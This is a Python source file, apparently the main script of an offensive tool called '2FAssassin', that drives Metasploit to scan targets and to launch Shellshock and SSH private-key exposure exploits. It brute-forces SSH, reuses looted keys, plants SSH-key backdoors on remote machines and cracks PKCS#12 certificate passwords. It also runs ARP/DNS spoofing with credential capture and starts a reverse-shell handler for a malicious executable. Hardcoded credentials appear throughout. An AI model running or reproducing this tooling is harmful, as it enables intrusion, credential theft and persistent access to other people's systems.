#!/usr/bin/env python


import argparse
import sys, os, time
import pickle
import msfrpc
import time
from glob import glob
from post import prepare, pka
from cert.transport import control
#from channel.ssh import establish
from cert.analysis import detest
from crack.pkcs12 import win, rid
from check.vuln.pub import stat, pkauthen
from classes.Colour import Colour
import subprocess
import webbrowser
from check.vuln.heartburn import enum
from check.vuln.ceragon import calluser
from check.vuln.shellshock import issue
from subprocess import call

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple


def advanced(ip_input):

    client = msfrpc.Msfrpc({})
    client.login('msf','abc123')
    res = client.call('console.create')
    console_id = res['id']

    a = client.call('console.write', [console_id, "db_nmap -f --iflist %s \n" %ip_input])
    a = client.call('console.write', [console_id, "db_nmap -v -O --osscan-guess %s \n" %ip_input])
    a = client.call('console.write', [console_id, "db_nmap -PA -PS -PO -PU %s \n" %ip_input])
    a = client.call('console.write', [console_id, "db_nmap -sT %s \n" %ip_input])
    a = client.call('console.write', [console_id, "db_nmap --reason %s \n" %ip_input])
    a = client.call('console.write', [console_id, "db_nmap %s \n" %ip_input])
    a = client.call('console.write', [console_id, "hosts \n"])
    a = client.call('console.write', [console_id, "services \n"])
    time.sleep(1)


    while True:
        res = client.call('console.read',[console_id])

        if len(res['data']) > 1:
            print res['data'],

        if res['busy'] == True:
            time.sleep(1)
            continue

        break
        cleanup = client.call('console.destroy',[console_id])
        print "Cleanup result: %s" %cleanup['result']
        exit()


def scan(ip_addr):

    client = msfrpc.Msfrpc({})
    client.login('msf','abc123')
    res = client.call('console.create')
    console_id = res['id']

    a = client.call('console.write', [console_id, "hosts \n"])
    a = client.call('console.write', [console_id, "db_nmap %s \n" %ip_addr])
    time.sleep(1)


    while True:
        res = client.call('console.read',[console_id])

        if len(res['data']) > 1:
            print res['data'],

        if res['busy'] == True:
            time.sleep(1)
            continue

        break


        cleanup = client.call('console.destroy',[console_id])
        print "Cleanup result: %s" %cleanup['result']
        exit()


def mainmenu():
    print "Done."
print ('''

 ___ ___ _                      _
|_  ) __/_\   ______ __ _ _____(_)_ _
 / /| _/ _ \ (_-<_-</ _` (_-<_-< | '  \+v2
/___|_/_/ \_\/__/__/\__,_/__/__/_|_||_|

''')

parser = argparse.ArgumentParser(description='Bypass 2FA - SMS, Voice, SSH')


parser.add_argument('--target',
    #action="store_true",
    help="IP Address" )

parser.add_argument('--silent',
    action="store_true",
    help="reduce output verbosity" )

parser.add_argument('--scan',
    help="Network enumeration { basic | advanced }")

parser.add_argument('--check',
    help="Check for vulnerabilities, modules")

parser.add_argument('--cert',
    help="Certificate management")

parser.add_argument('--filetype',
    help="Specify file *.extension")

parser.add_argument('--user',
    help="username")

parser.add_argument('--user2',
        help="username2")

parser.add_argument('--secret',
        help="password")

parser.add_argument('--spoof',
        help="spoof")

parser.add_argument('--gateway',
        help="gateway")

parser.add_argument('--mitm',
        help="mitm")

parser.add_argument('--host',
            help="server ip")

parser.add_argument('--mode',
            help="mode")

parser.add_argument('--auto',
    help="auto mode for automation")

parser.add_argument('--post',
    help="post modules")

parser.add_argument('--db',
    help="Manage your trophies.")

parser.add_argument('--key',
    help="keys management")

parser.add_argument('--log',
    help="View logs")

parser.add_argument('--tunnel',
    help="Create ssh tunnel with looted private keys")

parser.add_argument('--chain',
    help="The amount of connecting chain")

args = parser.parse_args()


modulename = 'msfrpc'
if modulename not in sys.modules:
    print 'Where is the package? Please import the {} module'.format(modulename)


if args.scan == "basic":
    ip_addr = args.target
    print "You selected BASIC scan. \n"
    try:
        scan(ip_addr)
    except:
        print "something is wrong with basic scan!"
        pass

elif args.scan == "advanced":
    ip_input = args.target
    print "You selected ADVANCED scan. \n"
    try:
        advanced(ip_input)
    except:
        print "something is wrong with advanced scan!"
    sys.exit(0)

'''

if args.check == "heartbleed" and args.mode == "attack":
      print "\n ... Start Heartbleed Attacks ... \n\n"
      # contains foreign inheritancem modues
      # repeat 10 times
      for _ in range(10):
          try:
              enum.something()
          except:
              print "\n Something's wrong with traditional method...\n"
              pass
          #sys.exit(0)
        print "\n ... Try the alternative methods ... \n\n"

        try:
            extract.something()
        except:
            print "\n Something's wrong with alternative method ...\n"
            pass

            print "\n ... Try the final methods ... \n\n"
        try:
            module.something()
        except:
            print "\n Something's wrong with the final method ...\n"
            pass
            sys.exit(0)

'''

if args.check == "auto" and args.mode == "attack":
    print "\n ... Ceragon FibeAir IP-10 SSH Private Key Exposure (CVE-2015-0936) ... \n\n"
    calluser.wash()

    print "\n ... Shellshock (CVE-2014-6271) ... \n\n"
    print (Colour.BLUE + "\n ... Shellshock (CVE-2014-6271) ... \n\n" + Colour.END)
    print (Colour.YELLOW + "\n (1) Determine live hosts \n\n" + Colour.END)
    issue.gethost()
    print (Colour.YELLOW + "\n (2) Enumerate web daemon \n\n" + Colour.END)
    os.system("timeout 3 gnome-terminal -x sh -c 'nmap -p80,443 -iL ./check/vuln/shellshock/host -oG - | nikto -h - | tee ./check/vuln/shellshock/mapikto; bash'")
    time.sleep (15)
    print (Colour.YELLOW + "\n (3) Determine CGI function \n\n" + Colour.END)
    os.system("grep 'cgi-bin' ./check/vuln/shellshock/mapikto | awk '{ print $3 }' | sed 's/:$//' | sort -u > ./check/vuln/shellshock/targeturi")
    print (Colour.YELLOW + "\n (4) Preparing payloads \n\n" + Colour.END)

    call (['bash', './check/vuln/shellshock/process'])
    print (Colour.YELLOW + "\n (5) Launching attack \n\n" + Colour.END)
    os.system("msfconsole -q -r ./check/vuln/shellshock/apache_mod_cgi_bash_env")

    print (Colour.BLUE + "\n ... ExaGrid Known SSH Key and Default Password (CVE-2016-1560) ... \n\n" + Colour.END)
    os.system("msfconsole -q -r ./check/vuln/exagrid/privkey")

    print (Colour.BLUE + "\n ... F5 BIG-IP SSH Private Key Exposure (CVE-2012-1493) ... \n\n" + Colour.END)
    os.system("msfconsole -q -r ./check/vuln/f5/bigip")

    print (Colour.BLUE + "\n ... Loadbalancer.org Enterprise VA SSH Private Key Exposure ... \n\n" + Colour.END)
    os.system("msfconsole -q -r ./check/vuln/loadbalancer/loadbalance")

    print (Colour.BLUE + "\n ... Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution ... \n\n" + Colour.END)
    os.system("msfconsole -q -r ./check/vuln/array/network")

    print (Colour.BLUE + "\n ... Quantum DXi V1000 SSH Private Key Exposure ... \n\n" + Colour.END)
    os.system("msfconsole -q -r ./check/vuln/quantum/dxi")
    sys.exit(0)

if args.check == "ssh" and args.mode == "attack":
      print "\n ... Start SSH Brute Force Attacks ... \n\n"
      cmd = ""
      cmd += "msfconsole -q -r ./check/vuln/brute/brute"
      cmd += ";"
      os.system(cmd)
      sys.exit(0)


if args.check == "ssh" and args.mode == "auth":
    print "Access machines with looted keys! \n"
    print "Preparing user file ... ... \n"
    prepare.looted_user()
    print "Let system cool down ... ... \n"
    time.sleep(5)
    prepare.clarify(); time.sleep(3)
    prepare.root()
    cmd = ""
    cmd += "msfconsole -q -r ./check/vuln/pub/reauth"
    os.system(cmd)
    time.sleep(3)

    print "\n ... Gathering Statistics from 'authorized_keys' ...\n"
    print "\n ##### These users can access to other machines via public key authentication: ######\n"
    stat.userxxx()
    print "\n ... User accessibity were found on these machines: \n"
    stat.machinexxx()
    sys.exit(0)


if args.check == "ssh" and args.mode == "backdoor":
    print "Backdooring remote machines! \n"
    pka.prep(); time.sleep(2)
    pka.process(); time.sleep(2)
    pka.add_backdoor(); time.sleep(2)
    pka.clean()
    sys.exit(0)


if args.check == "pka" and args.mode == "detect":
    print "Check if remote host supported key-based authentication. \n"
    pkauthen.check()
    sys.exit(0)

if args.check == "sshkey" and args.mode == "attack":
    print (Colour.GREEN + "\nCreating user\n" + Colour.END)
    #os.system("bash -c 'source she; 2fauser'")
    time.sleep (5)
    print (Colour.GREEN + "\nAdding arbitrary SSH keys to all accessible accounts\n" + Colour.END)
    os.system("msfconsole -q -r ./check/vuln/backdoor/arbi")
    sys.exit(0)


if args.cert == "analyze" and args.filetype == "pfx":
    detest.analyze()
    sys.exit(0)

# start removing the password
if args.cert == "crack" and args.mode == "dic" and args.filetype == "pfx":
    print (Colour.GREEN + "\n...... Dictionary Attacks on PKCS#12 ......\n" + Colour.END)
    win.crack()   # crack the pfx passwords
    time.sleep(2)
    try:
        rid.median()  # remove the password from pfx
    except:
        print "\n Could not remove passwords on client certificate! \n"
    sys.exit()

if args.cert == "crack" and args.mode == "bruteforce" and args.filetype == "pfx":
    print (Colour.GREEN + "\n...... Brute Force Attacks on PKCS#12 ......\n" + Colour.END)
    win.bruteforce()   # crack the pfx passwords via brute force
    time.sleep(2)
    try:
        rid.median()  # remove the password from pfx
    except:
        print "\n Could not remove passwords on client certificate! \n"
    sys.exit()

if args.cert == "windows":
    first = args.user; second = args.secret; third = args.host
    try:
        control.generate(first, second, third)
    except:
        "ERROR: Script generation failed.\n"
        pass

    cmd = ""
    cmd += "msfconsole -q -r ./cert/transport/instruction/muscle"
    os.system(cmd)
    sys.exit(0)



if args.mitm == "on" and args.filetype == "pfx":

    first = args.spoof;second = args.user;third = args.secret;fourth = args.target;fifth = args.gateway
    try:
        control.test_phishme(first, second, third, fourth, fifth)
    except:
        "ERROR: Script generation failed.\n"
        pass
        spoofer = "msfconsole -q -r ./cert/transport/instruction/test_phishme"
        os.system(spoofer)
        os.system("exit")
        time.sleep(3)
    # DNS Spoofing -  start dns spoofing
    dns = "gnome-terminal -x sh -c 'ettercap -T -q -i eth0 -M arp:remote -P dns_spoof //%s// //%s//; bash'" % (fifth, fourth)
    os.system(dns)
    # MiTM - start capture the credentials and sensitive info
    os.system("gnome-terminal -x sh -c '/root/2fassassin/mitm/PCredz/Pcredz -i eth0; bash'")
    # launch multi handler for reverse shell
    os.system("gnome-terminal -x sh -c 'msfconsole -q -r ./cert/transport/instruction/multi; bash'")
    # Reverse shell - start popping up reverse session handler to listen for reverse connection, after user download the SIGNED malicious.exe to execute
    sys.exit(0)


if args.tunnel == "ssh" and args.chain == "1":
    try:
        print "Starting SSH tunnel\n"
        os.system ("sshpass -p 'password' ssh user1@172.16.173.191 'ssh -L 5555:localhost:6666 msfuser1@172.16.173.187'")
        time.sleep(3)
        #os.system("ssh -L 5555:localhost:6666 msfuser1@172.16.173.187")
        print "\n"
        #os.system ("ps aux | grep ssh | grep msfuser1")
        #print "\n"
        #os.system ("netstat -tpln | grep ssh | grep msfuser1")
    except:
        print "ERROR: something is wrong!"
        #pass
        sys.exit()



'''
if args.tunnel == "ssh" and args.connection == "1":
    satu = args.user; dua = args.secret; tiga = args.host
    try:
        establish.single(satu, dua, tiga)
    except:
        "ERROR: SSH tunnel could not be established.\n"
        pass
        sys.exit(0)

#if args.tunnel == "ssh" and connection == "2":

'''


if args.log == "all":
    webbrowser.open('file:///root/.msf4/loot/', new=2)
    sys.exit(0)
if args.log == "loot":
    client = msfrpc.Msfrpc({});client.login('msf','abc123')
    res = client.call('console.create');console_id = res['id']
    a = client.call('console.write', [console_id, "loot \n"]);time.sleep(1)
    a = client.call('console.write', [console_id, "creds -t password \n"]);time.sleep(1)
    while True:
        res = client.call('console.read',[console_id])
        if len(res['data']) > 1:
            print res['data'];break
            sys.exit(0)

if args.log == "whereis":
    xuser = args.user
    try:
        stat.origin(xuser)
    except:
        "Ooops! User was not found!\n"
        pass
        sys.exit()

if args.log =="account":
    xcomputer = args.host
    try:
        stat.accountxxx(xcomputer)
    except:
        "No account accesibility.\n"
        pass
        sys.exit()


def main():
    try:
        mainmenu()
    except KeyboardInterrupt:
        print bcolors.RED+"\nCaught Ctrl-C, GraceFul Exit. POOOF"+bcolors.ENDC


if __name__ == '__main__':
    try:
        main()
    except:
        sys.exit()
